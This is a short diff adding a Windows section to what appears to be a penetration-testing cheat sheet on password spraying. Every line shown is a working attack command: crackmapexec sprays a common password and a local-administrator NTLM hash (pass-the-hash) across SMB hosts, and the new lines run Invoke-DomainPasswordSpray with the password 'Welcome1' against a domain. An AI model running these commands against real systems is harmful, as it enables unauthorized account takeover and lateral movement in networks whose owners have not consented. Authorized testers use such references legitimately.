@@ -43,3 +43,8 @@ crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 # Administration Spray
 crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 ```
+## Windows
+```
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
